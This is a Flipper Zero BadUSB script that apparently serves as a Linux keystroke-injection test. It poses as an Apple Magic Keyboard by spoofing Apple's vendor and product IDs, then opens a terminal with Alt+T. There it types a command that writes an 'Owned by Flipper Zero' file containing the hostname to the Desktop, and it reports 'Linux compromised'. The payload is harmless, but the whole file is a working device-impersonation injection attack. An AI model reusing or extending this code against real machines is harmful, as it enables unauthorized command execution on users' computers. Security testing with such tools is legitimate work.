let badusb = require("badusb");
let notify = require("notification");
let flipper = require("flipper");
let eventLoop = require("event_loop");
let gui = require("gui");
let dialog = require("gui/dialog");

let views = {
    dialog: dialog.makeWith({
        header: "BadUSB Linux Test",
        text: "Press OK to start",
        center: "Start",
    }),
};

badusb.setup({
    vid: 0x05AC,  // Apple's actual VID
    pid: 0x0250,  // Apple Keyboard PID
    mfrName: "Apple Inc.",
    prodName: "Magic Keyboard",
    layoutPath: "/ext/badusb/assets/layouts/en-US.kl"
});

eventLoop.subscribe(views.dialog.input, function (_sub, button, eventLoop, gui) {
    if (button !== "center")
        return;

    gui.viewDispatcher.sendTo("back");

    if (badusb.isConnected()) {
        notify.blink("green", "short");
        print("Executing Linux payload...");
        badusb.press("ALT", "t");
        delay(750);
        badusb.println("echo 'Owned by Flipper Zero - $(hostname)' > ~/Desktop/exploited_linux.txt");
        delay(500);
        badusb.println("exit");
        notify.success();
    print("Linux compromised");
    } else {
        print("USB not connected");
        notify.error();
    }

    eventLoop.stop();
}, eventLoop, gui);

eventLoop.subscribe(gui.viewDispatcher.navigation, function (_sub, _item, eventLoop) {
    eventLoop.stop();
}, eventLoop);

gui.viewDispatcher.switchTo(views.dialog);
eventLoop.run();
badusb.quit();
